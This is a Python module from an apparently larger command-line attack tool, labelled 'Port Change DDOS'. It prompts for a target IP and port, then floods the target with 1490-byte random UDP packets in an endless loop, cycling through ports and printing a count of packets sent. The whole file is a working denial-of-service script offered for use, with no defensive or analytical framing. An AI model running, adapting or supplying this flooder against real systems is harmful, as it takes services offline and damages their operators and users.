import sys
import os
import time
import socket
import random
import time
import main
class portchange:
    def  attack(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        main.Hasky.clear(self)
        print(os.system("figlet 'Port Change DDOS' -f digital -c"))
        ip = input(main.color.GREEN + "IP Target : ")
        port = int(input("Port       : "))
        main.Hasky.clear(self)
        print(os.system("figlet 'Attack Start' -f digital -c"))
        sent = 0
        while True:
            try:
                sock.sendto(bytes, (ip,port))
                sent = sent + 1
                port = port + 1
                print (main.color.RED + "Sent {0} packet to {1} throught port:{2}".format(sent,ip,int(port)))
                if port == 65534:
                    port = 1
            except KeyboardInterrupt:
                print(main.color.CYAN + " [-] keyboard Intrupt ")
                time.sleep(15)
                main.Hasky.spot(self)
            except Exception:
                print(main.color.GREEN + " Server Error :")
if __name__ == "__main__":
    poatt = portchange()
    poatt.attack()